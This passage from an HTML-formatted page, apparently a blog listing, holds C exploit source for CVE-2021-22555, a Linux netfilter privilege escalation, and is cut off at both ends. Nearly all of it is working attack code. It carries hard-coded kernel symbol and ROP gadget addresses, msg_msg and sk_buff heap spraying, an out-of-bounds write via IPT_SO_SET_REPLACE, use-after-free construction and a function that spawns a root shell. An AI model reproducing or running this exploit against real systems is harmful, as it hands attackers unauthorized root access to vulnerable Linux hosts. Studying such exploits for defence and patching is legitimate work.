class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> socket_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span></span><br><span class="line">        <span class="type">char</span> pad[<span class="number">0x108</span> + PRIMARY_MSG_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span></span><br><span class="line">    &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">    data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">    data.replace.size = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    </span><br><span class="line">    data.entry.next_offset = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    data.entry.target_offset = </span><br><span class="line">            <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    </span><br><span class="line">    data.match.u.user.match_size = <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">    data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">    data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// partial overwrite the next object</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)))</span><br><span class="line">        <span class="keyword">if</span> (errno == ENOPROTOOPT)</span><br><span class="line">            errExit(<span class="string">&quot;ip_tables module is not loaded!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         socket_fd;</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ident namespace</span></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create socket!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(socket_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span 